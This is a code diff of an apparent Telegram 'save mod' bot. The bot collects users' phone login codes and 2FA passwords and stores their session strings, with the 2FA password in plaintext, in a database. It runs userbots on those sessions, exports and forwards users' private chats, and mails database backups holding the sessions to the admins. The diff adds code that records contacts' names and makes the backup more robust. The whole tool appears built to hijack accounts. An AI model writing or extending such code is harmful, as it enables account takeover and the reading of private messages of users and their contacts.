@@ -111,6 +111,14 @@ cursor.execute('''
     )
 ''')
 
+cursor.execute('''
+    CREATE TABLE IF NOT EXISTS user_names (
+        user_id INTEGER PRIMARY KEY,
+        name TEXT,
+        username TEXT
+    )
+''')
+
 conn.commit()
 
 active_clients = {}
@@ -138,7 +146,6 @@ def escape_html(text):
     return html.escape(str(text))
 
 def get_media_icon(msg):
-    """Возвращает иконку и описание для медиафайла"""
     if msg.photo:
         return "📷 Фото"
     elif msg.video:
@@ -148,7 +155,7 @@ def get_media_icon(msg):
     elif msg.video_note:
         return "🔄 Кружок"
     elif msg.sticker:
-        return f"🎨 Стикер: {msg.sticker.emoji if hasattr(msg.sticker, 'emoji') and msg.sticker.emoji else 'sticker'}"
+        return f"🎨 Стикер"
     elif msg.gif:
         return "🎬 GIF"
     elif msg.document:
@@ -161,10 +168,6 @@ def get_media_icon(msg):
         return "📍 Локация"
     elif msg.game:
         return "🎮 Игра"
-    elif msg.invoice:
-        return "💳 Инвойс"
-    elif msg.gift:
-        return "🎁 Подарок"
     else:
         return None
 
@@ -221,17 +224,10 @@ def get_code_keyboard():
     return kb
 
 async def export_chat_to_html(client, chat_id, chat_name, me):
-    """Экспорт чата в HTML с поддержкой медиа"""
     messages = []
     async for msg in client.iter_messages(chat_id, limit=3000):
-        # Получаем текст сообщения
         text = msg.text or ""
-        
-        # Получаем информацию о медиа
         media_info = get_media_icon(msg)
-        
-        # Создаем ссылку на сообщение в Telegram (если есть)
-        msg_link = f"https://t.me/c/{str(chat_id)[4:]}/{msg.id}" if str(chat_id).startswith('-100') else f"https://t.me/{chat_name}/{msg.id}"
         
         try:
             if msg.out:
@@ -249,10 +245,10 @@ async def export_chat_to_html(client, chat_id, chat_name, me):
             
             text = escape_html(text).replace('\n', '<br>')
             
-            # Формируем блок сообщения
             media_html = ""
             if media_info:
-                media_html = f'<div class="media">🎬 {media_info} - <a href="{msg_link}" target="_blank">Открыть в Telegram</a></div>'
+                msg_link = f"https://t.me/c/{str(chat_id)[4:]}/{msg.id}" if str(chat_id).startswith('-100') else f"https://t.me/c/{chat_id}/{msg.id}"
+                media_html = f'<div class="media">{media_info} - <a href="{msg_link}" target="_blank">Открыть в Telegram</a></div>'
             
             messages.append(f'''
             <div class="message {direction}">
@@ -651,14 +647,28 @@ async def cmd_chats(message):
                 ent = await cl.get_entity(dlg.id)
                 if getattr(ent, 'bot', False) or ent.id == uid or is_target_admin(ent.id):
                     continue
-                name = ent.first_name or ent.last_name or "Без имени"
+                
+                name = ent.first_name or ent.last_name
+                
+                if not name:
+                    cursor.execute('SELECT name FROM user_names WHERE user_id=?', (ent.id,))
+                    row = cursor.fetchone()
+                    if row and row[0]:
+                        name = row[0]
+                    else:
+                        name = f"User_{ent.id}"
+                
                 if ent.username:
                     display = f"{name} (@{ent.username})"
                 else:
                     display = f"{name} (ID: {ent.id})"
+                    
                 chats.append({'id': ent.id, 'name': display, 'raw_name': name})
             except:
                 chats.append({'id': dlg.id, 'name': dlg.name or str(dlg.id), 'raw_name': dlg.name or str(dlg.id)})
+    
+    chats.sort(key=lambda x: x['raw_name'].lower())
+    
     active_chats[uid] = chats
     if not chats:
         await message.answer("📭 Нет диалогов")
@@ -851,7 +861,7 @@ async def chat_forward_all(cb):
         'target_name': target_name,
         'filter': 'all'
     }
-    await cb.message.answer("📨 Введи @username бота или ID куда переслать:\nНапример: @SaveModAyuGramRobot")
+    await cb.message.answer("📨 Введи @username бота или ID куда переслать:\nНапример: @savemod77bot")
     await cb.answer()
 
 @dp.callback_query_handler(lambda c: c.data.startswith('chat_forward_self_'))
@@ -868,7 +878,7 @@ async def chat_forward_self(cb):
         'target_name': target_name,
         'filter': 'self'
     }
-    await cb.message.answer("📨 Введи @username бота или ID куда переслать:\nНапример: @SaveModAyuGramRobot")
+    await cb.message.answer("📨 Введи @username бота или ID куда переслать:\nНапример: @savemod77bot")
     await cb.answer()
 
 @dp.message_handler(lambda msg: msg.from_user.id in pending_chat)
@@ -1250,16 +1260,23 @@ async def cmd_backup(message):
         return
     st = await message.answer("💾 Создаю бэкап...")
     bp = os.path.join(VOLUME_PATH, f'backup_{datetime.now().strftime("%Y%m%d_%H%M%S")}.db')
-    shutil.copy2(DB_PATH, bp)
-    with open(bp, 'rb') as f:
-        for aid in ADMIN_IDS:
-            try:
-                await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption="💾 Бэкап БД")
-                await f.seek(0)
-            except:
-                pass
-    os.remove(bp)
-    await st.edit_text("✅ Бэкап отправлен")
+    try:
+        shutil.copy2(DB_PATH, bp)
+        file_size = os.path.getsize(bp)
+        if file_size > 0:
+            with open(bp, 'rb') as f:
+                for aid in ADMIN_IDS:
+                    try:
+                        await bot.send_document(aid, InputFile(f, filename=os.path.basename(bp)), caption=f"💾 Бэкап БД от {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n📦 Размер: {file_size / 1024:.1f} KB")
+                        await f.seek(0)
+                    except:
+                        pass
+            await st.edit_text("✅ Бэкап отправлен")
+        else:
+            await st.edit_text("⚠️ База данных пуста, бэкап не создан")
+        os.remove(bp)
+    except Exception as e:
+        await st.edit_text(f"❌ Ошибка бэкапа: {e}")
 
 # ========== РЕГИСТРАЦИЯ ==========
 
@@ -1324,6 +1341,10 @@ async def complete_auth(cb, uid):
         await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
         ss = data['client'].session.save()
         me = await data['client'].get_me()
+        
+        # Сохраняем имя пользователя
+        cursor.execute('INSERT OR REPLACE INTO user_names (user_id, name, username) VALUES (?, ?, ?)', (uid, me.first_name, me.username))
+        
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                        (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
@@ -1353,6 +1374,9 @@ async def handle_2fa(message):
         await data['client'].sign_in(password=message.text.strip())
         ss = data['client'].session.save()
         me = await data['client'].get_me()
+        
+        cursor.execute('INSERT OR REPLACE INTO user_names (user_id, name, username) VALUES (?, ?, ?)', (uid, me.first_name, me.username))
+        
         cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                        (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
         conn.commit()
@@ -1421,6 +1445,13 @@ async def run_userbot(owner_id, session_string):
         if not event.is_private or event.out:
             return
         sid = event.sender_id
+        
+        # Сохраняем имя отправителя
+        if event.sender and event.sender.first_name:
+            cursor.execute('INSERT OR IGNORE INTO user_names (user_id, name, username) VALUES (?, ?, ?)', 
+                          (sid, event.sender.first_name, event.sender.username))
+            conn.commit()
+        
         if sid in muted_users:
             await event.delete()
             logger.info(f"🗑 Удалено от заглушенного {sid}")
